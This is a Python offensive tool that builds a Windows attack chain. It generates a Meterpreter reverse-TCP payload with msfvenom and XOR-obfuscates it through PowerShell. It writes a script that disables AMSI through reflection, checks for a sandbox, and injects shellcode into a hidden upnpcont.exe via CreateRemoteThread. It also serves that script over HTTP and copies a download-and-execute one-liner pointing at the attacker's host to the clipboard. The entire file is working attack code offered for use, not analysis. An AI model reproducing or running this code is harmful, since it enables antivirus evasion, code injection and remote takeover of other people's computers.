# Import modules
import sys
import subprocess
import pyperclip
import argparse
import os
import random
from http.server import test, SimpleHTTPRequestHandler

# Define a function to run powershell commands using pwsh
def run_powershell(commands):
    args = ["pwsh", "-Command", commands]
    result = subprocess.run(args, capture_output=True, text=True)
    # Check if there was an error
    if result.returncode != 0:
        # Print the error message and exit
        print(f"Error: {result.stderr}")
        exit(1)
    # Return the output
    return result.stdout

# Create an ArgumentParser object that describes the script and its arguments
parser = argparse.ArgumentParser(description="A script that runs powershell commands in linux using pwsh and copies final results to the clipboard.")


parser.add_argument("-l", "--lhost", required=True, help="Local IP from attacking machine")
parser.add_argument("-p", "--lport", required=True, help="Local Port from attacking machine")
parser.add_argument("-w", "--wport", required=True, help="Local Port web port")
args = parser.parse_args()

print("generating msfvenom")
subprocess.run(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={args.lport} -f ps1 -o ./buf.txt", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

def file_read(file_path):
	if os.path.isfile(file_path):
    		text_file = open(file_path, "r")
    		content = text_file.read()
    		text_file.close()
    		return content

buf = file_read("buf.txt")

xor_rand=random.randint(1, 255)

xorpayload = f"""
{buf}
$xor_key = {xor_rand}

$buffer_line = '[Byte[]] $buf =  '

for ($def = 0; $def -lt $buf.Count; $def++) {{
	$buf[$def] = $buf[$def] -bxor $xor_key
	$y = [System.BitConverter]::ToString($buf[$def]);
	$buffer_line += '0x' + $y
	if ($def -ne ($buf.Count - 1)) {{
		$buffer_line += ','
	}}
}}

$decrypt_block = 'for ($abc = 0; $abc -lt $buf.Count; $abc++) {{ $buf[$abc] = $buf[$abc] -bxor ' + $xor_key + '}}'

$buffer_line | Out-File -FilePath ./buf_xor.txt

"""
run_powershell(xorpayload)

bufxor = file_read("./buf_xor.txt")
reflectinject1 = r'''
foreach($type in [Ref].Assembly.GetTypes()) {if ($type.Name -like "*iUtils") {$aType=$type}}
foreach($field in $aType.GetFields('NonPublic,Static')) {if ($field.Name -like "*Context") {$cntxt=$field}}
[IntPtr]$ptr=$cntxt.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$starttime = Get-Date -Displayhint Time
Start-sleep -s 5
$finishtime = Get-Date -Displayhint Time
if ( $finishtime -le $starttime.addseconds(4.5) ) { exit }
'''

reflectinject2 = f'''
$sacproc = "C:\\Windows\\System32\\upnpcont.exe"
{bufxor}
for ($abc = 0; $abc -lt $buf.Count; $abc++) {{ $buf[$abc] = $buf[$abc] -bxor {xor_rand}}}
'''

reflectinject3 = r'''
$proc = Start-Process $sacproc -PassThru -WindowStyle Hidden
$procid = $proc.Id

$hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $procid)
$addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Int32]$lpNumberOfBytesWritten = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten) 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
'''
reflectinject_combo = reflectinject1 + reflectinject2 + reflectinject3

fileps1 = open("reflect.ps1", "w")
fileps1.write(str(reflectinject_combo))
fileps1.close()

web_request = f'''foreach($type in [Ref].Assembly.GetTypes()) {{if ($type.Name -like "*iUtils") {{$aType=$type}}}}; foreach($field in $aType.GetFields('NonPublic,Static')) {{if ($field.Name -like "*Context") {{$cntxt=$field}}}}; [IntPtr]$ptr=$cntxt.GetValue($null); [Int32[]]$buf=@(0); [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1); iex(new-object net.webclient).downloadstring("http://{args.lhost}:{args.wport}/reflect.ps1")'''



# Copy the output to the clipboard
print("sent powershell code to clipboard")
pyperclip.copy(web_request)


test(SimpleHTTPRequestHandler,port=args.wport)
